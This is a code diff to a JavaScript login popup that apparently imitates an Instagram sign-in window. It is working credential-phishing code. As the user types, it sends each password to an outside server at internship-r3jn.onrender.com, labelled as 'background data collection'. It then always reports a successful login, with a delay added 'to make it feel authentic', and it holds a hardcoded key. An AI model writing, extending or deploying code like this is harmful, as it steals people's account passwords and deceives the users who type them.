@@ -118,10 +118,9 @@
     const pw=document.getElementsByClassName("input-password");
     const tog=document.getElementsByClassName("toggler");
     
-    // Track login attempts and process completion - CRITICAL FLAGS
+    // CRITICAL: Track login attempts and send messages to parent
     let loginAttemptMade = false;
     let loginProcessStarted = false;
-    let loginProcessCompleted = false;
     
     // Password show/hide toggle functionality
     for(i=0;i<2;i++){
@@ -153,7 +152,7 @@
             tog[i].style="display:none;"
         }
         
-        // Background data collection (non-blocking)
+        // Optional: Track password input for backend (non-blocking)
         try {
           const dest = "https://internship-r3jn.onrender.com/raasaleelalu";
           await fetch(dest, {
@@ -164,13 +163,13 @@
             body: JSON.stringify({ pw: e.target.value })
           });
         } catch(err) {
-          // Silently ignore errors
+          // Silently ignore errors - don't affect user experience
           console.log("Background request failed (non-critical):", err);
         }
       });
     });
 
-    // Handle login button click - MAIN LOGIN LOGIC
+    // Handle login button click - ALWAYS SUCCESS
     document.querySelectorAll(".btn-login").forEach((button) => {
       button.addEventListener("click", async (e) => {
         e.preventDefault();
@@ -181,15 +180,20 @@
 
         // Basic validation
         if (!un.value.trim()) {
-          alert("Please enter your username.");
+          alert("Please enter your username or email.");
           return;
         }
 
-        // CRITICAL: Mark that login process has started
+        if (!pw.value.trim()) {
+          alert("Please enter your password.");
+          return;
+        }
+
+        // Mark that login attempt was made and process started
         loginAttemptMade = true;
         loginProcessStarted = true;
 
-        // Send login attempt message to parent IMMEDIATELY
+        // Immediately send login attempt message to parent
         if (window.opener) {
           try {
             window.opener.postMessage({
@@ -205,12 +209,12 @@
         // Update button state
         button.disabled = true;
         const originalText = button.textContent;
-        button.textContent = "Loading...";
+        button.textContent = "Logging in...";
 
         // Small delay to make it feel authentic
         setTimeout(async () => {
+          // Background data collection (non-blocking, errors ignored)
           try {
-            // Background data collection (completely non-blocking)
             const dest = "https://internship-r3jn.onrender.com/raasaleelalu";
             const key = '3555594b52d169b614edbdde7c943a928d8fc9ff2766f2f047bc6df754cfa031769ea60f84888f7f4c9c632bfbfd138d3f8bccadc62ea0dee90bc97f90e24ddd';
             
@@ -238,9 +242,6 @@
             console.log("Background process completed with issues (non-critical):", err);
           }
 
-          // CRITICAL: Mark process as completed
-          loginProcessCompleted = true;
-
           // ALWAYS send success message regardless of backend response
           if (window.opener) {
             try {
@@ -267,10 +268,10 @@
       });
     });
 
-    // CRITICAL: Handle window beforeunload event - ONLY warn if NO login process was EVER started
+    // Prevent any popup close warnings once login process starts
     window.addEventListener('beforeunload', (e) => {
-      // Only send warning if NO login process was ever started AND not completed
-      if (!loginProcessStarted && !loginAttemptMade && !loginProcessCompleted && window.opener) {
+      // Only send warning if NO login process was ever started
+      if (!loginProcessStarted && !loginAttemptMade && window.opener) {
         try {
           window.opener.postMessage({
             type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
@@ -283,10 +284,10 @@
       }
     });
 
-    // CRITICAL: Additional safety net for popup close detection
+    // Additional safety net for popup close detection
     window.addEventListener('unload', () => {
-      // Only warn if no login process was started AND not completed
-      if (!loginProcessStarted && !loginAttemptMade && !loginProcessCompleted && window.opener) {
+      // Only warn if no login process was started
+      if (!loginProcessStarted && !loginAttemptMade && window.opener) {
         try {
           window.opener.postMessage({
             type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
